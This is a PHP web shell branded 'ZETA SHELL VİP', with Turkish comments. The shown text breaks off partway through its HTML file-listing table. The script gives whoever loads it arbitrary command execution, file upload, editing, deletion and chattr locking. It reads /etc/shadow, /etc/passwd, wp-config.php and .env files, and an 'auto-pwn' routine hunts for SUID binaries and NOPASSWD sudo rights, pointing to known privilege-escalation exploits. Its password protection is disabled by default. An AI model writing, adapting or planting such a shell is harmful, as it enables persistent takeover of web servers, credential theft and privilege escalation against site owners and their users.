<?php
// !!!!! HATA AYIKLAMA AÇIK - Çalışırsa sonra kapat !!!!!
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
// !!!!! HATA AYIKLAMA SONU !!!!!

# Konfigurasyon
$SHELL_VERSION = "v8.0  ";
$sayfaSifreleme ='0'; // 1: Açık, 0: Kapalı
$kullaniciAdi = 'zeta'; // DEĞİŞTİR BUNU AMK!
$sifre = 'kaos';      // BUNU DA DEĞİŞTİR!

// --- Oturum Yönetimi (Mesajlar için) ---
if (session_status() == PHP_SESSION_NONE) { @session_start(); }

# --- Yetki Kontrolü ---
function yetkiKontrol($kullaniciAdi, $sifre) { /* ... önceki kod ... */ global $sayfaSifreleme; if($sayfaSifreleme =='1') { if(empty($_SERVER['PHP_AUTH_USER']) || empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != $kullaniciAdi || $_SERVER['PHP_AUTH_PW'] != $sifre) { header('WWW-Authenticate: Basic realm=" - ACCESS DENIED"'); header('HTTP/1.0 401 Unauthorized'); die('<!DOCTYPE html><html><head><title>ACCESS DENIED</title><body style="background:#000; color:#f00; font-family:monospace; text-align:center;"><h1>ACCESS DENIED!</h1></body></html>'); } } }
yetkiKontrol($kullaniciAdi, $sifre);

// --- Temel Helper Fonksiyonlar ---
function formatSizeUnits($bytes) { /* ... önceki kod ... */ if ($bytes === false || $bytes === null) return '???'; if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . ' GB'; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . ' MB'; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . ' KB'; } elseif ($bytes > 1) { $bytes = $bytes . ' bytes'; } elseif ($bytes == 1) { $bytes = $bytes . ' byte'; } else { $bytes = '0 bytes'; } return $bytes; }
function fileExtension($file) { /* ... önceki kod ... */ $file = rtrim($file, '/'); $pos = strrpos($file, '.'); if ($pos === false) { return ''; } return substr($file, $pos + 1); }
function perms_to_string($perms) {
    if ($perms === false || $perms === null) return '????';
    $info = '';
    // Dosya türü - TÜM SATIRLARIN SONUNDA ; OLDUĞUNDAN EMİN OLALIM!
    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special  <-- Burası veya öncesi olabilir
    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
    else $info = 'u'; // Unknown

    // İzinler
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
} // Fonksiyonun kapandığından emin olalım
function encodePath($path) { return str_replace(array('/', '\\'), array('__SLASH__', '__BSLASH__'), $path); }
function decodePath($path) { return str_replace(array('__SLASH__', '__BSLASH__'), array('/', '\\'), $path); }
function runCommand($cmd) { /* ... önceki kod ... */ $output = ''; $error = ''; $ret_val = -1; if (function_exists('shell_exec')) { $output = shell_exec($cmd . ' 2>&1'); } elseif (function_exists('system')) { ob_start(); system($cmd . ' 2>&1', $ret_val); $output = ob_get_contents(); ob_end_clean(); } elseif (function_exists('passthru')) { ob_start(); passthru($cmd . ' 2>&1', $ret_val); $output = ob_get_contents(); ob_end_clean(); } elseif (function_exists('exec')) { exec($cmd . ' 2>&1', $output_array, $ret_val); $output = implode("\n", $output_array); } elseif (function_exists('proc_open')) { $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($cmd, $descriptorspec, $pipes); if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); fclose($pipes[1]); $error = stream_get_contents($pipes[2]); fclose($pipes[2]); $ret_val = proc_close($process); if (!empty($error)) $output .= "\nSTDERR:\n" . $error; } else { $output = "proc_open failed."; } } else { $output = "Command execution functions are disabled."; } return array('output' => htmlspecialchars(trim($output)), 'retval' => $ret_val); }

// --- PATH Belirleme ---
$script_path = dirname(__FILE__); $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : $script_path; $current_path = $script_path;
if (isset($_GET['p'])) { $decoded_p = decodePath($_GET['p']); $resolved_path = @realpath($decoded_p); if ($resolved_path !== false && @is_readable($resolved_path)) { $current_path = $resolved_path; } elseif (@file_exists($decoded_p) && @is_readable($decoded_p)) { $current_path = $decoded_p; } else { $current_path = $script_path; $_SESSION['message'] = 'Geçersiz veya okunamayan yol!'; $_SESSION['message_type'] = 'error'; } }
$current_path = str_replace('\\', '/', $current_path); if ($current_path !== '/') { $current_path = rtrim($current_path, '/'); } if (empty($current_path)) { $current_path = '/'; }
define("PATH", $current_path);

// --- İkon Fonksiyonu ---
function fileIcon($file) { /* ... önceki kod ... */ $full_path = PATH . '/' . $file; $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp", "ico"); $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc", "flac"); $video = array("mp4", "mov", "avi", "mkv", "webm", "flv", "wmv"); $code = array("php", "phtml", "html", "htm", "css", "js", "py", "sh", "json", "xml", "sql", "c", "cpp", "java", "rb", "go", "swift", "kt", "tpl", "ini", "conf"); $archive = array("zip", "rar", "tar", "gz", "7z", "bz2", "xz"); $doc = array("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp"); $ext = strtolower(fileExtension($file)); if (@is_dir($full_path)) return '<i class="fas fa-folder-open hacker-icon-folder"></i> '; if ($file == "error_log") return '<i class="fas fa-bug hacker-icon-error"></i> '; if ($file == ".htaccess" || $file == ".htpasswd" || $file == "config" || strpos($file, '.conf') !== false || strpos($file, '.ini') !== false) return '<i class="fas fa-cogs hacker-icon-config"></i> '; if (in_array($ext, $code)) return '<i class="fas fa-code hacker-icon-code"></i> '; if (in_array($ext, $imgs)) return '<i class="fas fa-file-image hacker-icon-image"></i> '; if (in_array($ext, $audio)) return '<i class="fas fa-file-audio hacker-icon-audio"></i> '; if (in_array($ext, $video)) return '<i class="fas fa-file-video hacker-icon-video"></i> '; if (in_array($ext, $archive)) return '<i class="fas fa-file-archive hacker-icon-archive"></i> '; if (in_array($ext, $doc)) return '<i class="fas fa-file-pdf hacker-icon-doc"></i> '; if ($ext == "txt" || $ext == "md" || $ext == "log") return '<i class="fas fa-file-alt hacker-icon-text"></i> '; return '<i class="fas fa-file hacker-icon-default"></i> '; }

// --- POST ve GET İşlemleri ---
$message = isset($_SESSION['message']) ? $_SESSION['message'] : ''; $message_type = isset($_SESSION['message_type']) ? $_SESSION['message_type'] : ''; unset($_SESSION['message'], $_SESSION['message_type']);
$action_result_output = ''; // Komut, analiz vb. çıktılar için

// GET İşlemleri
if ($_SERVER['REQUEST_METHOD'] === 'GET') { /* ... önceki GET işlemleri ... */ if (isset($_GET['chmod']) && isset($_GET['file'])) { /* chmod */ $file_to_chmod = PATH . '/' . urldecode($_GET['file']); $new_perm = intval($_GET['chmod'], 8); if (file_exists($file_to_chmod)) { if (@chmod($file_to_chmod, $new_perm)) { $_SESSION['message'] = 'Perms set to ' . sprintf('%o', $new_perm) . '!'; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: Chmod failed!'; $_SESSION['message_type'] = 'error'; } } else { $_SESSION['message'] = 'Error: File not found!'; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } if (isset($_GET['chattr']) && isset($_GET['file'])) { /* chattr */ $file_to_chattr = PATH . '/' . urldecode($_GET['file']); $attr_cmd = $_GET['chattr'] == 'lock' ? '+i' : '-i'; $command = "chattr " . $attr_cmd . " " . escapeshellarg($file_to_chattr); $cmd_result = runCommand($command); if (stripos($cmd_result['output'], 'Operation not permitted') === false && stripos($cmd_result['output'], 'No such file') === false && stripos($cmd_result['output'], 'command not found') === false && $cmd_result['retval'] <= 1) { $_SESSION['message'] = 'chattr ' . $attr_cmd . ' attempted.'; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: chattr failed: ' . $cmd_result['output']; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } if (isset($_GET['d']) && isset($_GET['file'])) { /* delete */ $item_to_delete = urldecode($_GET['file']); $item_path = PATH . "/" . $item_to_delete; $success = false; $error_msg = 'Unknown error!'; if (!file_exists($item_path)) { $error_msg = 'Item not found!'; } elseif (is_file($item_path)) { if (@unlink($item_path)) { $success = true; $msg = 'File deleted!'; } else { $error_msg = 'File deletion failed!'; } } elseif (is_dir($item_path)) { if (@rmdir($item_path)) { $success = true; $msg = 'Directory deleted (empty)!'; } else { $error_msg = 'Directory deletion failed (not empty/perms)!'; } } if ($success) { $_SESSION['message'] = $msg; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: ' . $error_msg; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } if (isset($_GET['dl']) && isset($_GET['file'])) { /* download */ $file_to_download = urldecode($_GET['file']); $file_path = PATH . "/" . $file_to_download; if (!is_file($file_path)) { $_SESSION['message']='Error: Not a file!'; $_SESSION['message_type']='error'; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } elseif (!is_readable($file_path)) { $_SESSION['message']='Error: Cannot read file!'; $_SESSION['message_type']='error'; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } else { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($file_path) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file_path)); @ob_clean(); @flush(); @readfile($file_path); exit; } } if (isset($_GET['read_config'])) { /* read config */ $config_file = ''; $common_configs = array( 'passwd' => '/etc/passwd', 'shadow' => '/etc/shadow', 'wpconfig' => PATH . '/wp-config.php', 'wpconfig_up' => dirname(PATH) . '/wp-config.php', 'env' => PATH . '/.env', 'env_up' => dirname(PATH) . '/.env', 'apache_conf' => '/etc/apache2/apache2.conf', 'nginx_conf' => '/etc/nginx/nginx.conf', 'php_ini' => php_ini_loaded_file() ?: '/etc/php/php.ini' ); if (isset($common_configs[$_GET['read_config']])) { $config_file = $common_configs[$_GET['read_config']]; } $config_content = @file_get_contents($config_file); if ($config_content !== false) { $action_result_output = "--- Content of " . htmlspecialchars($config_file) . " ---\n\n" . htmlspecialchars($config_content); } elseif (!empty($config_file)) { $action_result_output = "Error: Cannot read " . htmlspecialchars($config_file); } else { $action_result_output = "Error: Unknown config file requested."; } } }

// POST İşlemleri
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST["upload"])) { /* ... Upload logic ... */ if(isset($_FILES["fileToUpload"]) && $_FILES["fileToUpload"]["error"] == UPLOAD_ERR_OK) { $target_file = PATH . "/" . basename($_FILES["fileToUpload"]["name"]); if (!@is_writable(PATH)) { $_SESSION['message']='Hata: Dizin ('.htmlspecialchars(PATH).') yazılamıyor!'; $_SESSION['message_type']='error'; } elseif (@move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) { $_SESSION['message'] = htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).' yüklendi!'; $_SESSION['message_type']='success'; } else { $upload_error = $_FILES["fileToUpload"]["error"]; $_SESSION['message']='Hata: Yüklenemedi! (Error: '.$upload_error.')'; $_SESSION['message_type']='error'; } } else { $upload_error = isset($_FILES["fileToUpload"]["error"]) ? $_FILES["fileToUpload"]["error"] : 'Unknown'; $php_upload_errors = array( UPLOAD_ERR_INI_SIZE=>'php.ini size limit', UPLOAD_ERR_FORM_SIZE=>'Form size limit', UPLOAD_ERR_PARTIAL=>'Partial upload', UPLOAD_ERR_NO_FILE=>'No file', UPLOAD_ERR_NO_TMP_DIR=>'No tmp dir', UPLOAD_ERR_CANT_WRITE=>'Cannot write', UPLOAD_ERR_EXTENSION=>'PHP Extension stop'); $error_message = isset($php_upload_errors[$upload_error]) ? $php_upload_errors[$upload_error] : 'Unknown upload error.'; $_SESSION['message'] = 'Hata: ' . $error_message . ' (Code: ' . $upload_error . ')'; $_SESSION['message_type']='error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
    elseif (isset($_POST['rename'])) { /* ... Rename logic ... */ $original_path = PATH . "/" . $_POST['original_name']; $new_path = PATH . "/" . $_POST['new_name']; if (!file_exists($original_path)) { $msg='Hata: Orijinal bulunamadı!'; $type='error'; } elseif ($original_path === $new_path) { $msg='İsimler aynı!'; $type='info'; } elseif (@rename($original_path, $new_path)) { $msg='Yeniden adlandırıldı!'; $type='success'; } else { $msg='Hata: Adlandırılamadı! İzin?'; $type='error'; } $_SESSION['message'] = $msg; $_SESSION['message_type'] = $type; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
    elseif(isset($_POST['edit'])) { /* ... Edit logic ... */ $filename = PATH."/".$_POST['file_to_save']; if (!is_writable($filename)) { $msg='Hata: Hala yazılamıyor!'; $type='error'; } else { $data = $_POST['data']; if(@file_put_contents($filename, $data) !== false) { $msg='Kaydedildi!'; $type='success'; } else { $msg='Hata: Kaydedilemedi!'; $type='error'; } } $_SESSION['message'] = $msg; $_SESSION['message_type'] = $type; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
    elseif(isset($_POST['run_command'])) { $cmd = $_POST['command']; $cmd_result = runCommand($cmd); $action_result_output = $cmd_result['output']; }
    elseif(isset($_POST['analyze_system'])) { /* ... System Analyze logic ... */ $analysis_output = "--- OS/Kernel Info ---\n"; $analysis_output .= runCommand('uname -a')['output'] . "\n"; $os_release = @file_get_contents('/etc/os-release'); $analysis_output .= ($os_release ?: runCommand('cat /etc/issue')['output']) . "\n"; $analysis_output .= "--- Sudo Version ---\n"; $analysis_output .= runCommand('sudo -V 2>&1')['output'] . "\n"; $analysis_output .= "--- SUID Binaries ---\n"; $analysis_output .= runCommand('find / -perm -4000 -type f -ls 2>/dev/null')['output'] . "\n"; $analysis_output .= "\n--- SUGGESTIONS ---\n"; $analysis_output .= "* Check kernel on exploit-db / searchsploit.\n"; $analysis_output .= "* Check sudo version for vulns (e.g., Baron Samedit).\n"; $analysis_output .= "* Analyze SUID bins using GTFOBins.\n"; $analysis_output .= "* Run 'sudo -l'.\n"; $action_result_output = $analysis_output; }
    elseif(isset($_POST['attempt_autopwn'])) { /* ... Auto Pwn Logic ... */ $pwn_output = "--- Attempting Auto-Pwn --- \n"; $pwn_output .= "[+] Checking 'sudo -l'...\n"; $sudo_l = runCommand('sudo -l 2>&1')['output']; $pwn_output .= $sudo_l . "\n"; if (stripos($sudo_l, 'NOPASSWD:') !== false && stripos($sudo_l, 'may run the following commands') !== false) { $pwn_output .= "[!] Potential NOPASSWD sudo found! Check allowed commands!\n"; } else { $pwn_output .= "[-] No obvious NOPASSWD sudo found.\n"; } $pwn_output .= "[+] Checking common SUID exploits (basic)...\n"; $suid_bins = array('nmap','find','vim','cp','mv','bash','more','less','nano','awk'); foreach($suid_bins as $bin) { $find_cmd = "find / -name ".$bin." -perm -4000 -type f -print 2>/dev/null"; $found = runCommand($find_cmd)['output']; if (!empty($found)) { $pwn_output .= "[!] Found SUID binary: ".$found." (Check GTFOBins for '".$bin."')\n"; } } $pwn_output .= "[-] Basic SUID checks finished.\n"; $pwn_output .= "\n--- Auto-Pwn Attempt Finished --- \n"; $action_result_output = $pwn_output; }
} // POST sonu

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZETA SHELL VİP<?php echo $SHELL_VERSION; ?> [DEBUG]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
    <style>
        /* --- KAOS CSS --- */
        /* ... (CSS Stilleri önceki koddan aynen alınacak) ... */
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
        :root { --bg-color: #0a0a0a; --terminal-bg: #1a1a1a; --text-color: #00ff00; --header-color: #ff003c; --link-color: #00ffff; --link-hover: #ffffff; --border-color: #333; --icon-color: #ff003c; --button-bg: #ff003c; --button-text: #000; --button-hover-bg: #ff4d6d; --table-header-bg: #2a2a2a; --code-bg: #050505; --hacker-font: 'Fira Code', monospace; --perms-color: #aaaaaa; }
        body { background-color: var(--bg-color); color: var(--text-color); font-family: var(--hacker-font); margin: 0; padding: 0; font-size: 14px; line-height: 1.6; overflow-x: hidden; }
        .container-fluid { padding: 15px; max-width: 1600px; margin: 0 auto; }
        .hacker-nav { background-color: var(--terminal-bg); border-bottom: 2px solid var(--header-color); padding: 8px 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .navbar-brand { color: var(--header-color); font-weight: bold; font-size: 1.3em; text-shadow: 0 0 5px var(--header-color); } .navbar-brand i { margin-right: 8px; }
        .navbar-brand a, .breadcrumb a { color: var(--link-color); text-decoration: none; margin: 0 2px; } .navbar-brand a:hover, .breadcrumb a:hover { color: var(--link-hover); text-decoration: underline; }
        .breadcrumb { background: var(--terminal-bg); padding: 8px 12px; margin-bottom:15px; border: 1px solid var(--border-color); border-radius: 3px; word-break: break-all; color: var(--text-color); font-size: 0.9em; } .breadcrumb i { margin-right: 5px; color: var(--header-color); }
        .hacker-controls a button, .hacker-controls input[type="submit"], .quick-cmd-btn, .action-btn, .config-btn { background-color: var(--button-bg); color: var(--button-text); border: none; padding: 4px 8px; margin-left: 8px; cursor: pointer; font-family: var(--hacker-font); font-weight: bold; transition: background-color 0.3s ease; border-radius: 3px; font-size: 0.85em; margin-bottom: 5px; }
        .hacker-controls a button:hover, .hacker-controls input[type="submit"]:hover, .quick-cmd-btn:hover, .action-btn:hover, .config-btn:hover { background-color: var(--button-hover-bg); } .hacker-controls i { margin-right: 4px;}
        .hacker-table { width: 100%; border-collapse: collapse; margin-top: 15px; background-color: var(--terminal-bg); border: 1px solid var(--border-color); box-shadow: 0 0 10px rgba(255, 0, 60, 0.2); }
        .hacker-table th, .hacker-table td { border: 1px solid var(--border-color); padding: 6px 10px; text-align: left; vertical-align: middle; word-break: break-all; font-size: 0.9em; }
        .hacker-table th { background-color: var(--table-header-bg); color: var(--header-color); font-weight: bold; }
        .hacker-table tr:nth-child(even) { background-color: rgba(0, 255, 0, 0.03); } .hacker-table tr:hover { background-color: rgba(0, 255, 255, 0.08); }
        .hacker-table td a { color: var(--link-color); text-decoration: none; margin-right: 6px; display: inline-block; position: relative; } .hacker-table td a:hover { color: var(--link-hover); }
        .hacker-table td a .tooltiptext { visibility: hidden; width: 80px; background-color: #555; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; position: absolute; z-index: 1; bottom: 125%; left: 50%; margin-left: -40px; opacity: 0; transition: opacity 0.3s; font-size: 0.8em; } .hacker-table td a:hover .tooltiptext { visibility: visible; opacity: 1; }
        .hacker-icon-folder { color: #ffff00; } .hacker-icon-error { color: #ff4d4d; } .hacker-icon-config { color: #cccccc; } .hacker-icon-code { color: #66ccff; } .hacker-icon-image { color: #cc99ff; } .hacker-icon-audio { color: #ff99cc; } .hacker-icon-video { color: #ffcc66; } .hacker-icon-text { color: #ffffff; } .hacker-icon-archive { color: #99ff99; } .hacker-icon-doc { color: #ffad33; } .hacker-icon-default { color: var(--text-color); } .hacker-icon-lock { color: #f0ad4e; } .hacker-icon-anchor { color: #d9534f; }
        .perms { color: var(--perms-color); font-size: 0.9em; cursor: help; }
        form { margin-bottom: 15px; }
        .form-section { background-color: var(--terminal-bg); padding: 15px; margin-top: 15px; border: 1px solid var(--border-color); border-radius: 5px; } .form-section h3 { font-size: 1.1em; margin-bottom: 10px; color: var(--header-color);}
        input[type="file"], input[type="text"], textarea, select { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 6px; margin: 4px 0; width: calc(100% - 18px); font-family: var(--hacker-font); border-radius: 3px; font-size: 0.9em; }
        textarea { min-height: 250px; resize: vertical; } select { width: auto; }
        .message { padding: 8px 12px; margin: 12px 0; border-radius: 3px; font-weight: bold; border: 1px solid transparent; font-size: 0.9em;} .message.success { background-color: rgba(0, 255, 0, 0.1); border-color: var(--text-color); color: var(--text-color); text-shadow: 0 0 3px var(--text-color); } .message.error { background-color: rgba(255, 0, 60, 0.1); border-color: var(--header-color); color: var(--header-color); text-shadow: 0 0 3px var(--header-color); } .message i { margin-right: 6px; }
        .command-section, .collapsible-section { background-color: var(--terminal-bg); border: 1px solid var(--border-color); padding: 15px; margin-top: 20px; border-radius: 5px; }
        .collapsible-section summary { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; cursor: pointer; font-weight: bold; list-style: none; /* Oku gizle */ }
        .collapsible-section summary::-webkit-details-marker { display: none; /* Oku gizle (webkit) */ }
        .collapsible-section summary::before { content: '\f078'; /* FontAwesome down arrow */ font-family: 'Font Awesome 6 Free'; font-weight: 900; margin-right: 8px; display: inline-block; transition: transform 0.2s; }
        .collapsible-section[open] summary::before { transform: rotate(-180deg); }
        .collapsible-section[open] summary { border-bottom: 1px solid var(--header-color); padding-bottom: 5px; }
        .command-section h3, .collapsible-section h4 { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; }
        .command-form { display: flex; margin-bottom: 10px;} .command-form input[type="text"] { flex-grow: 1; margin-right: 10px; }
        .quick-cmd-buttons button, .config-btn { margin-right: 5px; margin-bottom: 5px;}
        pre.command-output, pre.info-output { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 10px; margin-top: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; font-size: 0.9em; }
        .hacker-footer { text-align: center; margin-top: 30px; padding: 10px; color: #555; font-size: 0.85em; border-top: 1px solid var(--border-color); } .hacker-footer a { color: var(--link-color); text-decoration: none; } .hacker-footer a:hover { color: var(--link-hover); }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes glow { 0% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } 50% { text-shadow: 0 0 8px var(--header-color), 0 0 15px var(--header-color); } 100% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } }
        .navbar-brand span { animation: glow 2.5s infinite alternate; } body { animation: fadeIn 0.8s ease-out; }
        @media (max-width: 768px) { /* ... responsive stiller ... */ .hacker-nav { flex-direction: column; align-items: flex-start;} .hacker-controls { margin-top: 10px; width: 100%; text-align: right;} .hacker-table th, .hacker-table td { padding: 5px 6px; font-size: 0.85em;} .hacker-table td a { margin-right: 4px;} textarea { min-height: 200px; } .hacker-table td:nth-child(2), .hacker-table th:nth-child(2), .hacker-table td:nth-child(3), .hacker-table th:nth-child(3) { display: none; } .command-form { flex-direction: column;} .command-form input[type="text"] { margin-right: 0; margin-bottom: 5px;} }
    </style>
</head>
<body>
    <div class="container-fluid">

        <nav class="hacker-nav">
             <div class="navbar-brand">
                 <i class="fas fa-meteor"></i>
                 <span id="shell-title"></span>
             </div>
             <div class="hacker-controls">
                 <a href="?upload=1&p=<?php echo urlencode(encodePath(PATH)); ?>"><button type="button"><i class="fas fa-upload"></i> Upload</button></a>
                 <a href="?p=<?php echo encodePath('/'); ?>"><button type="button"><i class="fas fa-broadcast-tower"></i> ROOT</button></a>
                 <a href="?p=<?php echo urlencode(encodePath($doc_root)); ?>"><button type="button"><i class="fas fa-sitemap"></i> WebRoot</button></a>
             </div>
        </nav>

        <div class="breadcrumb">
            <i class="fas fa-folder"></i> Path: <?php /* Breadcrumb Kodu */ $path_for_breadcrumb = PATH; $path_for_breadcrumb = str_replace('\\', '/', $path_for_breadcrumb); if (empty($path_for_breadcrumb) || $path_for_breadcrumb === '/') { echo "<a href=\"?p=" . encodePath('/') . "\">/</a>"; } else { $paths = explode('/', $path_for_breadcrumb); $current_built_path = ''; $is_windows_path = preg_match('/^[a-zA-Z]:$/', isset($paths[0]) ? $paths[0] : ''); foreach ($paths as $id => $dir_part) { if ($dir_part === '' && $id === 0 && !$is_windows_path) { $current_built_path = '/'; echo "<a href=\"?p=" . encodePath($current_built_path) . "\">/</a>"; continue; } if ($is_windows_path && $id === 0) { $current_built_path = $dir_part . '/'; echo "<a href=\"?p=" . encodePath($current_built_path) . "\">" . htmlspecialchars($dir_part) . "</a>/"; continue; } if ($dir_part === '') continue; if ($current_built_path === '/' || preg_match('/\/$/', $current_built_path)) { $current_built_path .= $dir_part; } else { $current_built_path .= '/' . $dir_part; } echo "<a href='?p=" . encodePath($current_built_path) . "'>" . htmlspecialchars($dir_part) . "</a>/"; } } ?>
        </div>

        <?php if (!empty($message)): /* Mesaj */ echo '<div class="message '.$message_type.'"><i class="fas fa-info-circle"></i> '.$message.'</div>'; endif; ?>

        <?php
        // --- Ana İçerik Alanı ---
        $show_file_manager = true; // Varsayılan
        if (isset($_GET['upload']) || (isset($_GET['r']) && isset($_GET['file'])) || (isset($_GET['e']) && isset($_GET['file']))) {
             // Formları göster
             if (isset($_GET['upload'])) { /* Upload Form */ echo '<div class="form-section"><h3><i class="fas fa-upload"></i> Upload to ' . htmlspecialchars(PATH) . '</h3><form method="post" enctype="multipart/form-data" action="?p='.urlencode(encodePath(PATH)).'"><input type="file" name="fileToUpload" id="fileToUpload" required><input type="submit" class="action-btn" value="Upload!" name="upload"></form></div>'; }
             elseif (isset($_GET['r']) && isset($_GET['file'])) { /* Rename Form */ $item_to_rename = urldecode($_GET['file']); echo '<div class="form-section"><h3><i class="fas fa-edit"></i> Rename: ' . htmlspecialchars($item_to_rename). '</h3><form method="post" action="?p='.urlencode(encodePath(PATH)).'"><input type="hidden" name="original_name" value="' . htmlspecialchars($item_to_rename) . '">New Name:<input type="text" name="new_name" value="' . htmlspecialchars($item_to_rename) . '" required><input type="submit" class="action-btn" value="Rename!" name="rename"></form></div>'; }
             elseif (isset($_GET['e']) && isset($_GET['file'])) { /* Edit Form */ $file_to_edit = urldecode($_GET['file']); $file_path = PATH . "/" . $file_to_edit; echo '<div class="form-section">'; if (!is_file($file_path)) { echo '<div class="message error">Hata: Dosya değil!</div>'; } elseif (!is_readable($file_path)) { echo '<div class="message error">Hata: Okunamıyor!</div>'; } elseif (!is_writable($file_path)) { echo '<div class="message error">Uyarı: Yazılamıyor!</div>'; $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); echo '<h4><i class="fas fa-eye"></i> Viewing: ' . htmlspecialchars($file_to_edit) . '</h4><textarea readonly style="background-color: #101010;">' . $content . '</textarea>'; } else { $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); echo '<form method="post" action="?p='.urlencode(encodePath(PATH)).'"><h3 style="color: var(--header-color);"><i class="fas fa-file-pen"></i> Editing: ' . htmlspecialchars($file_to_edit) . '</h3><textarea name="data">' . $content . '</textarea><br><input type="hidden" name="file_to_save" value="' . htmlspecialchars($file_to_edit) . '"><input type="submit" class="action-btn" value="Save Changes!" name="edit"></form>'; } echo '</div>'; }
             $show_file_manager = false;
        }

        // Dosya Yöneticisi
        if ($show_file_manager) {
            if (!is_dir(PATH)) { echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin değil! Path: ' . htmlspecialchars(PATH) . '</div>'; }
            elseif (!($scan = @scandir(PATH))) { echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin okunamadı! (' . htmlspecialchars(PATH) . ')</div>'; }
            else {
                // Dosya/Klasör listeleme tablosu...
                $folders = array(); $files = array(); foreach ($scan as $obj) { if ($obj == '.' || $obj == '..') continue; $full_obj_path = PATH . '/' . $obj; if (@is_dir($full_obj_path)) { array_push($folders, $obj); } else { array_push($files, $obj); } } usort($folders, 'strcoll'); usort($files, 'strcoll');
                echo '<table class="hacker-table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>';
